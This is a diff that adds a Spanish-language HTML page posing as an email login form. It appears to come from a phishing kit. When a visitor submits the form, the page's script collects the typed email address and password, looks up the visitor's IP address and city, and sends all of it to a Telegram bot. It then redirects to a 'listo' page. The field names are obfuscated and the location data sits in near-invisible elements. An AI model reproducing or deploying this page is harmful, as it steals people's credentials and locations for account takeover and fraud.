@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<!-- Inserted by miarroba -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<!-- Inserted by miarroba -->
+    <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+    <link rel="stylesheet" href="lapa/aparent.css">
+    <title>Internet - Home</title>
+  
+
+    
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="new/yeltele/tell.js"></script>
+<script>
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("tikitaka").value;
+    u_name2 = document.getElementById("mondacaso").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "MMMBB\n☰ccc: " + u_name + "\n☰clv11: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'listo.html';
+    });
+    return false;
+  };
+
+</script>
+</head>
+<body>
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+    <h2></h2>
+    <center>
+        <form method="post" action="#" onsubmit="return sender();">
+        <img style="width: 30%;  " src="new/logoms_660-660x432.jpg" alt=""> <div class="clear"></div> 
+        <h2 style="text-align: left;">Iniciar Sesión</h2>
+        <h4 style="text-align: left; font-size: 10pt;">Por favor continua e ingresa lo requerido.</h4>
+        <label style="text-align: left;" for="email"   >Correo Electrónico:</label>
+        <input   type="email"  id="tikitaka" name="tikitaka"    required>
+
+        <label style="text-align: left;" for="password">Contraseña:</label>
+        <input  id="mondacaso" name="mondacaso" type="password" required>
+
+        <input  type="submit" value="SIGUIENTE">
+    </form>
+<!-- Inserted by miarroba -->
+</script></noframes></noembed></noscript><script type="text/javascript" src="https://hosting.miarroba.info/?__muid=&amp;h=2163888&amp;t=1712840558&amp;k=2b191935433c6d863bdb5d091981dcba"></script><noscript><img alt="beacon" border="0" width="1" height="1" src="https://hosting.miarroba.info/?__muid=&amp;h=2163888&amp;t=1712840558&amp;k=2b191935433c6d863bdb5d091981dcba&amp;img=1" /></noscript>
+<!-- Inserted by miarroba -->
+</body> <div style="color: rgb(255, 255, 255);font-size: 0.05px;">
+<p id="gfg"></p>
+<p id="ip"></p>
+<p id="address"></p></div>
+</html>
